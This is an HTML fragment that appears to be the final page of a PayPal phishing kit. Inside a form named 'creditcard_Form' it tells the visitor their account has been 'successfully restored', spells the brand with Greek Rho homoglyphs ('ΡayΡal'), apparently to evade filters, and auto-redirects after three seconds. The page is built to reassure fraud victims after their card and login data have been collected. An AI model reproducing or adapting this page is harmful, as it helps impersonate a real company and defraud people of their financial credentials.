					<form method="post" name="creditcard_Form" action="" class="edit">
                        <p class="group"><strong>Your PayPal account has been successfully restored.</strong>
<p>You have completed all the checklist items, you must log in again to see the changes to your account.</p><p>&Rho;ay&Rho;al takes the safety of your account, business and financial data as seriously as you do, and these ongoing checks of our system contribute to our high level of security.</p>
                        </p>

                        <p class="bcenter"><center>
<h3>REDIRECTING</h3><img src="../icon/header_logginginAction.gif" border="0" class="actionImage" alt=""><p class="note">You will be redirected automatically to login page in 3 seconds</p>
                        </center></p>
                        
                        
                    </form>

<script type="text/JavaScript">
<!--
setTimeout("location.href = 'success'",3000);
-->
</script>